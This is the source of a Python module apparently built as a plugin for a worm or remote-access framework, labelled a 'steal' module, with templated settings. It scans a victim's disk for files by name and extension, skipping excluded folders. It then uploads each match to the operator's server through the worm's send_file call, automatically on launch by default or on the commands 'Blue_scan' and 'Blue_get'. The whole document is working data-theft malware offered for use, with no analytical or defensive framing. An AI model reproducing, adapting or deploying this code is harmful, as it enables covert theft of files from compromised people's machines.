#!name##BlueMax
#!itemType##module
#!fileType##PY_MOD
#!info##A Python module that scans the disk for files matching given criteria and uploads them to the server.
#!hiveType##PySM
#!lang##python
#!reqMod##PyNiffler
#!pyType##module
#!Var##BMAX_tar_fname##_NULL##Names of target files to search for. Separate names with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
#!Var##BMAX_tar_fext##_NULL##File extensions to search for. Separate extensions with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
#!Var##BMAX_ban_dname##_NULL##Directory names in which searching will be skipped. Separate names with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
#!Var##BMAX_ban_fname##_NULL##File names that will be excluded from searching. Separate names with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
#!Var##BMAX_auto_start##True##Automatically starts searching and uploading files upon launch.##str
#!Var##BMAX_pause_send##3##Pause between file uploads. If you're using sockets for communication, set the time to a few seconds to avoid errors.##str

{% if BMAX_tar_fname == "NO_VALUE" %}
    {% set BMAX_TAR_FNAME = [] %}
{% else %}
    {% set BMAX_TAR_FNAME = pyTOOL.buildListStr(BMAX_tar_fname, ",") %}
{% endif %}

{% if BMAX_tar_fext == "NO_VALUE" %}
    {% set BMAX_TAR_FEXT = [] %}
{% else %}
    {% set BMAX_TAR_FEXT = pyTOOL.buildListStr(BMAX_tar_fext, ",") %}
{% endif %}

{% if BMAX_ban_dname == "NO_VALUE" %}
    {% set BMAX_BAN_DNAME = [] %}
{% else %}
    {% set BMAX_BAN_DNAME = pyTOOL.buildListStr(BMAX_ban_dname, ",") %}
{% endif %}

{% if BMAX_ban_fname == "NO_VALUE" %}
    {% set BMAX_BAN_FNAME = [] %}
{% else %}
    {% set BMAX_BAN_FNAME = pyTOOL.buildListStr(BMAX_ban_fname, ",") %}
{% endif %}




from time import sleep

class BlueMax:
    MTYPES = "steal"
    STAND_TH = False
    def __init__(self, master_worm: object):
        self.worm = master_worm
        self.TARGET_file_name = {{BMAX_TAR_FNAME}}
        self.TARGET_file_ext = {{BMAX_TAR_FEXT}}
        self.TARGET_BAN_dir = {{BMAX_BAN_DNAME}}
        self.TARGET_BAN_file_name = {{BMAX_BAN_FNAME}}
        self.auto_start = {{pyTOOL.getBoolValue(BMAX_auto_start)}}
        self.pause_send_file = {{BMAX_pause_send}}
        self.NIFFLER = self.buildNiffler()

    @property
    def FLAG_WORK_NIFFLER(self) -> bool:
        return self.NIFFLER.WORKING_FLAG_FIND
    
    @property
    def TARGETS(self) -> list:
        return self.NIFFLER.Targets
    
    def buildNiffler(self) -> object:
        return PyNiffler(target_file_name=self.TARGET_file_name, target_file_ext=self.TARGET_file_ext, ban_dirs=self.TARGET_BAN_dir, ban_file_name=self.TARGET_BAN_file_name)
    
    def scanTargets(self) -> None:
        if self.FLAG_WORK_NIFFLER:
            self.worm.send_msg("Scanning is still ongoing.")
        else:
            self.NIFFLER.start()
    
    def sendTargets(self) -> None:
        if self.FLAG_WORK_NIFFLER:
            self.worm.send_msg("ERROR: Niffler is still looking for files.")
            return
        self.worm.send_msg("Start send files....")
        for t in self.TARGETS:
            self.worm.send_file(t)
            sleep(self.pause_send_file)
    
    def exeCmd(self, command: str, *args, **kwargs) -> None:
        cmd = command.split(" ")
        match cmd[0]:
            case "Blue_scan":
                self.scanTargets()
            case "Blue_get":
                self.sendTargets()
    
    def help(self) -> str:
        h = "Blue_scan - Start scanning for files.\n"
        h += "Blue_get - Starting file downloads.\n"
        return h
    
    def working(self) -> None:
        while self.FLAG_WORK_NIFFLER:
            sleep(1)
        self.worm.send_msg("Niffler has scanned the files. They are ready to be sent.")
        if self.auto_start:
            self.sendTargets()

    def start(self) -> None:
        print("BlueMax Starting.....")
        self.NIFFLER.start()
        self.working()


